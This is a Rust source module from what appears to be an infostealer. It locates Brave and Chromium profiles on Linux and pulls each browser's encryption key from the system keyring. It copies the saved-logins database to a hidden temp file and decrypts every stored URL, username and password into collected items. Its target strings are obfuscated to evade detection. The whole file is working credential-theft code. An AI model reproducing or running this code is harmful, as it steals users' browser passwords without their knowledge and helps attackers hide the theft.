// collect/browser.rs

use std::error::Error;
use std::path::PathBuf;
use crate::errors::{BrowserError,CollectError};
use super::{CollectedData, CollectedItem, ItemKind, keyring};
use glimmer_obfstr::obfs;

#[derive(Debug)]
pub struct BrowserCredential {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: Vec<u8>,
}

impl BrowserCredential {
    pub fn masked_password(&self, visible_chars: usize) -> String {
        let plain = String::from_utf8_lossy(&self.password);
        if plain.len() <= visible_chars {
            return plain.to_string();
        }
        let visible: String = plain.chars().take(visible_chars).collect();
        let hidden_count = plain.chars().count() - visible_chars;
        format!("{}{}", visible, "*".repeat(hidden_count))
    }
}

/// Browser profile locations and their encryption approach
pub struct BrowserProfile {
    name: String,
    profile_dir: PathBuf,
    /// label browser uses in the keyring
    keyring_label: String,
}

fn known_browsers(home: &str) -> Vec<BrowserProfile> {
    vec![
        BrowserProfile {
            name: obfs!("brave").to_string(),
            profile_dir: PathBuf::from(format!(
                "{}/{}", home, obfs!(".config/BraveSoftware/Brave-Browser/Default").as_str()
            )),
            keyring_label: obfs!("Brave Keys/Brave Safe Storage").to_string(),
        },
        BrowserProfile {
            name: obfs!("chromium").to_string(),
            profile_dir: PathBuf::from(format!(
                "{}/{}", home, obfs!(".config/chromium/Default").as_str()
            )),
            keyring_label: obfs!("Chromium Keys/Chromium Safe Storage").to_string(),
        },
        // need to add firefox still, doesnt use system keyring has its own nss/pkcs11 and optional pass
    ]
}

pub fn collect() -> Vec<CollectedItem> {
    crate::dbg_log!("starting collection: browser");
    let mut items = Vec::new();

    let home = match std::env::var(obfs!("HOME").as_str()) {
        Ok(h) => h,
        Err(_) => {
            crate::dbg_log!("failed getting home dir from env var");
            CollectError::NotAvailable.record();
            return items;
        }
    };

    let browsers = known_browsers(&home);

    for browser in &browsers {
        let key = match keyring::get_secret_by_label(&browser.keyring_label) {
            Ok(k) => k,
            Err(e) => {
                e.record();
                crate::dbg_log!("{}: no keyring key found", browser.name);
                continue;
            }
        };

        let derived_key = match derive_chromium_key(&key) {
            Ok(dk) => dk,
            Err(_e) => {
                BrowserError::KeyRetrieval.record();
                crate::dbg_log!("{}: key derivation failed: {}", browser.name, _e);
                continue;
            }
        };

        match dump_credentials(browser, &derived_key) {
            Ok(creds) => {
                for cred in creds {
                    items.push(CollectedItem {
                        kind: ItemKind::BrowserCredential,
                        data: CollectedData::BrowserCred {
                            browser: browser.name.clone(),
                            url: cred.url,
                            username: cred.username,
                            password: cred.password,
                        },
                    });
                }
            }
            Err(_e) => {
                BrowserError::QueryFailed.record();
                crate::dbg_log!("{}: credential dump failed: {}", browser.name, _e);
            }
        }
    }

    crate::dbg_log!("finished collection. browser items: {}", items.len());
    items
}

fn derive_chromium_key(raw_key: &[u8]) -> Result<Vec<u8>, BrowserError> {
    // Chromium on Linux uses PBKDF2-HMAC-SHA1
    // salt: b"saltysalt"
    // iterations: 1
    // key length: 16 bytes (AES-128)
    use hmac::Hmac;
    use pbkdf2::pbkdf2;
    use sha1::Sha1;

    let mut derived = vec![0u8; 16];
    pbkdf2::<Hmac<Sha1>>(raw_key, obfs!("saltysalt").as_bytes(), 1, &mut derived)
        .map_err(|_e| {
            crate::dbg_log!("chromium pbkdf2 failed: {}", _e);
            BrowserError::DecryptFailed
        })?;

    Ok(derived)
}

fn decrypt_chromium_blob(key: &[u8], encrypted: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    // Latest chromium encrypted blobs on my workstation (linux x86_64):
    // - First 3 bytes: "v11" version prefix
    // - Remaining bytes: AES-128-CBC encrypted with PKCS7 padding
    // - IV: 16 bytes of 0x20 (space character)

    if encrypted.len() < 4 {
        return Err("".into());
    }

    let version = &encrypted[..3];
    if version != b"v10" && version != b"v11" {
        return Err(format!("unknown version: {:?}", version).into());
    }

    let ciphertext = &encrypted[3..];
    let iv = vec![0x20u8; 16]; // Chromium's hardcoded IV

    use aes::cipher::{BlockDecryptMut, KeyIvInit};
    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    let mut buf = ciphertext.to_vec();
    let decrypted = Aes128CbcDec::new_from_slices(key, &iv)?
        .decrypt_padded_mut::<aes::cipher::block_padding::Pkcs7>(&mut buf)
        .map_err(|_e| {
            crate::dbg_log!("decryption failed: unpad failed: {}", _e);
            BrowserError::DecryptFailed
        })?;

    Ok(decrypted.to_vec())
}

fn dump_credentials(browser: &BrowserProfile, derived_key: &[u8]) -> Result<Vec<BrowserCredential>, BrowserError> {
    let login_db = browser.profile_dir.join(obfs!("Login Data").as_str());
    if !login_db.exists() {
        crate::dbg_log!("db doesnt exist: {}", login_db.display());
        return Err(BrowserError::DatabaseNotFound);
    }

    // Copy since browser may have it locked. Testing, will just copy to mem or another solution soon
    let tmp = format!("/tmp/.gl_{}", browser.name);
    std::fs::copy(&login_db, &tmp)
    .map_err(|_e| {
        crate::dbg_log!("tmp db error: {}: {}", tmp, _e);
        BrowserError::DatabaseNotFound
    })?;

    let conn = rusqlite::Connection::open_with_flags(
        &tmp,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
    ).map_err(|_e| {
        crate::dbg_log!("db connection failure: {}", _e);
        BrowserError::QueryFailed
    })?;

    let mut stmt = conn.prepare(
        obfs!("SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0 AND length(username_value) > 0 and length(origin_url) > 0;").as_str()
    ).map_err(|_e| {
        crate::dbg_log!("db query failed: {}", _e);
        BrowserError::QueryFailed
    })?;

    let mut creds = Vec::new();

    let rows = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,
            row.get::<_, String>(1)?,
            row.get::<_, Vec<u8>>(2)?,
        ))
    }).map_err(|_e| {
        crate::dbg_log!("failed parsing rows: {}", _e);
        BrowserError::QueryFailed
    })?;


    for row in rows.flatten() {
        let (url, username, encrypted) = row;
        // crate::dbg_log!("browser_cred_enc ({} bytes): {:02x?}", encrypted.len(), &encrypted[..std::cmp::min(20, encrypted.len())]);

        match decrypt_chromium_blob(derived_key, &encrypted) {
            Ok(password) => {
                // dumped my passwords to my console enough times now
                // crate::dbg_log!("browser_cred_dec {}: {} {} {}", browser.name.to_string(), url, username, String::from_utf8_lossy(&password));
                creds.push(BrowserCredential {
                    browser: browser.name.to_string(),
                    url,
                    username,
                    password,
                });
            }
            Err(_e) => {
                BrowserError::DecryptFailed.record();
                // should probably track success/failure rates
                // 1 failure is normal missing pw entry etc, majority or all failures is bad and should be logged
                crate::dbg_log!("decrypt failed: {}", _e);
            }
        }
    }

    let _ = std::fs::remove_file(&tmp);

    Ok(creds)
}